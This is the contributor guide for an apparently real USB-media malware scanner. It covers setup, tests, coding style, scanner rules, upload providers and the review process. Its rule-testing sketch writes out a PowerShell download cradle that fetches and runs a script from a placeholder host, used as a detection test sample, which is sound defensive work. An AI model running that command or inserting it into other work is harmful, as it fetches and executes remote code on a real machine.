# Contributing to Ducky Can Shoot

Thanks for considering a contribution. DCS is a security tool: a wrong finding
costs somebody an afternoon, and a missed one costs them a machine. That shapes
everything below - small, reviewable changes, tests that show the evidence, and
honesty about what a check can and cannot see.

By contributing you agree that your work is licensed under the GPL-3.0-or-later,
the license of the project.

## Development environment

```bash
git clone https://github.com/Linux-Alex/ducky-can-shoot
cd ducky-can-shoot

# a virtual environment is enough for the tests; the GUI needs PyQt6
python3 -m venv .venv
.venv/bin/pip install -e '.[dev]'

# or, without installing anything: the core and the CLI run from the checkout
PYTHONPATH=src python3 -m dcs.cli version
```

For the graphical interface you also need the Qt QML modules and Kirigami from
your distribution:

```bash
sudo apt install python3-pyqt6 python3-pyqt6.qtqml qml6-module-org-kde-kirigami \
                 qml6-module-qtquick qml6-module-qtquick-controls \
                 qml6-module-qtquick-layouts qml6-module-qtquick-dialogs
```

Useful extras while developing: `clamav` and `clamav-daemon` (to exercise the real
engine), `zip` and `p7zip-full` (archiving), `udisks2` (mounting), and `qmlscene` or
`qml` for loading a single QML file.

Run the GUI from the checkout:

```bash
PYTHONPATH=src python3 -c "from dcs.cli import gui_main; raise SystemExit(gui_main())"
```

There is no build step. If you change a QML file, restart the GUI; a source
checkout always loads the QML from `src/dcs/gui/qml`, so no install is needed.

## Running the tests

```bash
PYTHONPATH=src python3 -m pytest                       # everything
PYTHONPATH=src python3 -m pytest tests/test_pipeline.py
PYTHONPATH=src python3 -m pytest -k heuristic -x
PYTHONPATH=src python3 -m pytest --cov=dcs             # needs pytest-cov
```

`PYTHONPATH=src` is required: the core is not installed into the environment when
you run from a checkout, and the tests import `dcs.*` directly. Test configuration
(`testpaths`, quiet output, warnings-as-errors for `dcs.*` deprecations) lives in
`pyproject.toml`.

The tests must run without a network, without a real USB stick, without a real
ClamAV installation and without a display. `tests/conftest.py` provides the shared
fixtures:

| Fixture | What it gives you |
| --- | --- |
| `fake_clamav` | Puts `tests/fakes` first on PATH and returns that directory. |
| `sample_builder` | A factory for custom trees and samples (payload scripts, PE images, macro documents, archives, ...). |
| `sample_tree` | A session scoped, USB-like tree with benign and malicious files. |
| `clean_tree` | A small, entirely benign tree. |
| `tmp_config` | An `AppConfig` whose output, report and outbox paths all live inside `tmp_path`. |
| `qapp` | An offscreen `QApplication`, skipped cleanly when PyQt6 is missing. |

The environment is scrubbed of `DCS_*` variables and the XDG directories are
redirected into a temporary directory, so a developer's own configuration can
never influence a test run.

- `tests/fakes/clamscan` and `tests/fakes/clamdscan` are Python stand-ins for the
  ClamAV front ends. They implement enough of the CLI (`--version`, `--ping`,
  `--file-list`, `--verbose`, `--no-summary`) and derive their results from file
  names: `eicar` is reported as a detection, `pua` as a PUA, `lockme` as an
  unreadable file, anything else is OK.
- Temporary directories and `tmp_path` replace real media. The tests are marked
  with `pytest.mark.skipif` when an external tool they need is missing, and known
  gaps are marked `pytest.mark.xfail` with the reason spelled out - if you fix one,
  remove the mark instead of deleting the test.
- `dcs.core.events.CollectingSink` records every event, so a pipeline test can
  assert on stage transitions (`stage_states()`), progress (`max_percent`),
  findings, log lines and the final summary without any front end.

If your change cannot be tested without a network or a real device, say so in the
pull request and explain how you verified it by hand.

## Coding style

The style is the one the code already uses; `ruff` and `mypy` enforce most of it
(`[tool.ruff]` and `[tool.mypy]` in `pyproject.toml`).

- **4 spaces**, LF line endings, a final newline, no trailing whitespace
  (`.editorconfig`). QML, TOML, JSON and YAML also use 4 spaces.
- **Line length 100**, though `E501` is not enforced: readability beats a hard
  column, but a 300-character line will be asked to change.
- **`from __future__ import annotations`** at the top of every module.
- **Type hints everywhere**, including return types. Use PEP 604 unions
  (`str | None`), not `Optional`, and built-in generics (`list[str]`, not
  `List[str]`).
- **Plain dataclasses.** No `attrs`, no `pydantic`, no validation framework.
  Structures that cross a boundary get a `to_dict()` method; see
  `docs/ARCHITECTURE.md` for the naming conventions in that dictionary.
- **No Qt imports in `dcs.core.** The core must stay importable and testable
  without PyQt6; the single tolerated exception is a function-local import in
  `dcs.core.device.open_in_file_manager`, which is a desktop convenience helper and
  not part of the pipeline. If you need something from the toolkit in the core,
  the answer is almost always an event or a plain value instead.
- **No backticks in file contents.** Backticks are Markdown code spans, so they
  belong in `.md` files only. Do not put them in Python docstrings, comments, QML
  strings or plain text files - a backtick in a docstring renders as literal noise
  in help output and in the interface.
- **Docstrings explain why.** A docstring that restates the function name is
  noise; a docstring that says why the obvious implementation is wrong is worth
  ten lines of code. Comments carry the same rule: explain the reason, not the
  mechanics.
- **Logging through the project logger**: `log = get_logger("modulename")` at
  module level, then `log.info(...)`, `log.warning(...)`. Never print from the
  core; never raise for a condition the report can explain.
- **Errors are reported, not raised**, across stage boundaries. See the error
  handling section of `docs/ARCHITECTURE.md`.
- **Enum values are lowercase and stable**: they are serialised into JSON and
  shown in the interface, so changing one is a breaking change.
- **QML** keeps presentation only. Logic belongs in `dcs/gui/backend.py` or in the
  models (`dcs/gui/models.py`), where it can be reached from a test. Use
  `Kirigami.Units` for spacing and sizes and `Kirigami.Theme` for colours so the
  interface follows the user's Plasma settings.
- **Imports are sorted** (ruff's `I` rules), standard library first, then third
  party, then `dcs`.

Check your work before pushing:

```bash
make lint                 # ruff over the whole tree, the same check as CI
ruff format --check .     # optional, the repo is not uniformly formatted yet
mypy
PYTHONPATH=src python3 -m pytest
```

CI pins the Ruff version, so a newer release cannot turn the tree red on its
own. To move the pin, run it yourself first: `uvx ruff@<version> check .`

## Adding a scanner rule

The built-in engine is data driven on purpose: the detection data lives in
`src/dcs/core/scanner/rules.py` and the logic that consumes it in
`src/dcs/core/scanner/heuristic.py`. Keep it that way.

1. **Check that the indicator belongs in the built-in engine.** Signature matching
   belongs in ClamAV. A rule here is justified when it describes behaviour
   (an HID payload script, a download cradle, a double extension), when it explains
   something ClamAV does not, or when the machine has no ClamAV at all.
2. **Add the data to `rules.py`**, in the table that fits: an extension set, a name
   pattern, a content regex, a registry key, an API name, a packer marker or a
   numeric threshold. Tables carry `(pattern, threat, severity)` or
   `(pattern, threat, severity, description)` tuples; the description is what the
   report shows as evidence.
3. **Wire it into `heuristic.py`** only if the existing checks do not already
   consume that table. Most rules need no code change at all.
4. **Add a test.** Write a temporary file that triggers the rule and assert the
   finding, and add a benign counterpart that must not trigger it. Assert the
   severity too: severity is what decides whether the medium is merely suspicious
   or infected, and therefore whether anything gets uploaded.
5. **Keep it conservative.** A rule that fires on ordinary files is worse than no
   rule. Bias towards a lower severity when the evidence is ambiguous, and prefer a
   specific pattern over a general one.

```python
# tests/test_heuristic_rules.py (sketch)
def test_powershell_download_cradle_is_high(tmp_path):
    sample = tmp_path / "update.ps1"
    sample.write_text(
        "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a.ps1')",
        encoding="utf-8",
    )
    findings = scan_one(sample)
    assert any(f.threat == "PowerShell download cradle" for f in findings)
    assert max(f.severity for f in findings) is Severity.HIGH
```

**Every detection rule must cite the evidence it relies on.** In practice that
means:

- the `description` of a content rule quotes the concrete pattern or snippet that
  matched, not a generic sentence;
- the finding's detail field contains the evidence (the current engine already
  includes a truncated snippet for script indicators) so an analyst can open the
  file and confirm the match without a debugger;
- the pull request says where the indicator comes from - a vendor write-up, a
  public malware report, a CVE, the payload you extracted yourself. If the
  provenance is "I have seen this", say so; do not pad it with a citation you did
  not read.
- if a rule is a heuristic rather than a documented indicator, its description must
  say what makes it meaningful, so a reader can judge the false positive risk.

## Adding an upload provider

An upload provider is a small object with one job: take a file, report progress,
return a link. Everything the pipeline needs is defined by the `UploadProvider`
protocol in `src/dcs/core/upload/base.py`.

### 1. Decide which shape you need

- **An ordinary "one POST (or PUT), one URL" host.** Add a `SimpleHostSpec` entry
  to `SIMPLE_HOSTS` in `src/dcs/core/upload/simple.py`. That is the whole adapter:
  the generic `SimpleHostProvider` handles multipart versus raw body, form fields,
  JSON versus plain-text responses, link extraction and basic-auth API keys.
- **A host with a real API flow** (server discovery, a session token, several
  calls). Write a module like `gofile.py` and subclass `BaseProvider`.

### 2. Implement the contract

```python
class UploadProvider(Protocol):
    provider_id: str          # stable id used in config.toml and on the CLI
    label: str                # human readable, shown in the GUI
    requires_key: bool        # True when it cannot work without an API key
    max_bytes: int            # hard limit in bytes, 0 when unpublished

    def availability(self) -> tuple[bool, str]:
        """(usable, explanation) - called before the stage starts."""

    def upload(self, path, *, progress=None, cancel=None,
               part_label="") -> UploadResult:
        """Upload one file and return its public link."""
```

Rules that the existing adapters follow and yours should too:

- **Never raise out of `upload()`.** Return an `UploadResult` with `ok=False` and an
  `error` string. `UploadCancelled` is the one exception: raise it from the file
  reader when the cancel event is set, and let `BaseProvider` translate it.
- **Check the size first.** Use `self._check_size(path, self.max_bytes)` so an
  oversized image fails immediately with a clear message instead of after an hour
  of transfer.
- **Stream through `ProgressReader`.** It gives `requests` a real
  `Content-Length` (servers that reject chunked uploads still work) and reports
  every chunk to the progress callback while honouring cancellation.
- **Use the `link` the API returned.** Never synthesise a URL from an id: gofile's
  working link uses the folder code, not the file id, and that has changed before.
- **Record how you verified it.** The simple-host specs carry `notes` and
  `verified` fields precisely so that the next person knows whether an entry is
  live, documented or inferred. Fill them in.
- **Prefer the real response over the documented one.** If the documentation and
  the service disagree, the service wins; note the disagreement in the `notes`.

### 3. Register it

Add the provider to `build_provider()` and to `provider_catalog()` in
`src/dcs/core/upload/registry.py`. The catalog entry (`id`, `label`, `requiresKey`,
`maxBytes`, `notes`) is what the GUI combo box and `dcs providers` display, so a
missing entry means an invisible provider.

If your provider needs a new secret, add the field to the relevant configuration
dataclass in `core/config.py`, add the resolution in `AppConfig` (the
`resolve_secret(value, command, env_var)` helper), and document it in
`docs/CONFIGURATION.md`. A secret must never be required in the config file.

### 4. Test it

- **Unit tests** for the pieces you can isolate: URL construction, link
  extraction, error mapping, the response shapes you know. Use a fake transport
  (monkeypatched `requests`) rather than the network.
- **A live test** for the real endpoint, skipped unless the developer opts in (a
  `pytest.mark.skipif` on an environment variable such as `DCS_LIVE_TESTS`; the
  suite has no live tests yet, so introduce the convention if you add the first
  one). It must upload a small, harmless generated file, assert that a link comes
  back, and fetch the link to confirm it serves the same bytes. Never upload
  anything from a real medium in a test.
- **A negative test** for the interesting failure: an API key that is missing
  (`availability()` must return `False` with a useful message), a size over the
  limit, and a rate-limit or 5xx response that must be retried rather than treated
  as a permanent failure.
- **Update the research document** if the host's behaviour contradicts what
  `docs/research/cloud-upload-apis.md` records. That document is the reason the
  adapter list looks the way it does, and stale entries there are how a project
  ends up recommending a dead service.

## Reporting bugs

A good bug report for DCS contains:

- the DCS version (`dcs version --json`), the distribution and the Python version;
- the output of `dcs doctor` (it collects most of what is needed, and `--offline`
  keeps it from touching the network);
- what you expected and what happened, with the exact command line;
- the relevant part of the log (`--log-level DEBUG`) and, when the bug is in a
  report, the report file itself.

Redact before posting: file names from the medium, paths that reveal a user name,
the share link, and anything that looks like a credential. If in doubt, describe
the shape of the data rather than pasting it.

Security issues do not go in the tracker. Follow `SECURITY.md`.

## Pull requests

- **Keep them small and single-purpose.** A rule addition, an adapter, a fix and a
  refactor are four pull requests, not one.
- **Write a commit message that explains why.** The diff shows what changed; the
  message says what problem it solves. Reference the issue if there is one.
- **Run the suite.** `PYTHONPATH=src python3 -m pytest` must pass, and `ruff check .`
  must be clean. Mention anything you could not test and how you verified it.
- **Touch only what you need.** Unrelated reformatting makes a security change
  unreviewable. Do not rename public structures (stages, event names, JSON keys,
  provider ids) without a discussion first: they are contracts, as listed at the
  end of `docs/ARCHITECTURE.md`.
- **Say what you verified by hand**, especially for anything involving devices,
  mounting, real ClamAV, a real upload or the GUI.
- **Expect questions about failure modes.** A reviewer will ask what happens when
  the file disappears mid-scan, when the medium is unreadable, when the upload is
  cancelled at 90 percent, when the configuration is wrong, and what the change
  does to the safety interlocks (nothing is archived or uploaded when the medium is
  not clean). Having those answers ready speeds the review up.
- **Do not add a dependency casually.** The core is standard library plus
  `requests`; anything else needs a justification in the pull request, and it must
  not be needed for the CLI to work on a machine without it.
- **Documentation ships with the change.** A new configuration key, a new flag, a
  new provider or a changed behaviour updates `README.md`, `docs/CONFIGURATION.md`,
  `docs/ARCHITECTURE.md` or `docs/ROADMAP.md` as applicable. A change whose
  documentation is stale is not finished.

## AI-assisted contributions

Part of this project was written with AI assistance (see the section with the same
name in the README), so AI-assisted contributions are explicitly welcome here. The
standard is the same for everybody, and disclosure is what makes that possible:

- **Say so in the pull request.** The PR template has a field for it. One sentence
  is enough: what was generated, and what you checked yourself.
- **You are responsible for the code either way.** Read it, understand it, and be
  ready to explain it in review. If you cannot explain a line, do not submit it.
- **Tests are not optional because the code came from a model.** A generated
  detection rule without a test that shows the evidence it relies on will be asked
  to add one; so will a generated fix without a regression test.
- **No invented facts.** Comments, documentation and commit messages must describe
  what the code actually does. Claims about hosts, limits, formats or behaviours
  need a source or a live check; the research notes in `docs/research/` show what
  that looks like.
- **No copied code with an incompatible license.** Model output can reproduce
  training data. If a suggestion looks like it came from another project, do not
  paste it; write the equivalent yourself and cite the original in the description.

Reviewers will treat AI-assisted and hand-written code identically: the same
questions about correctness, evidence and tests apply. What is not welcome is code
whose author cannot explain why it is correct.

## Where things live

| Document | What it answers |
| --- | --- |
| [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | how the modules fit together, the event design, the stage flow |
| [docs/CONFIGURATION.md](docs/CONFIGURATION.md) | every configuration key with its default |
| [docs/CLI.md](docs/CLI.md) | the command line reference |
| [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) | when something does not work |
| [docs/EXTENDING.md](docs/EXTENDING.md) | adding a rule, an engine, a host, a report format |
| [docs/THREAT-MODEL.md](docs/THREAT-MODEL.md) | what DCS defends against, and what it does not |
| [docs/ROADMAP.md](docs/ROADMAP.md) | what is planned, including the Rust/C++ migration |
| [docs/PUBLISHING.md](docs/PUBLISHING.md) | how this repository is set up and released |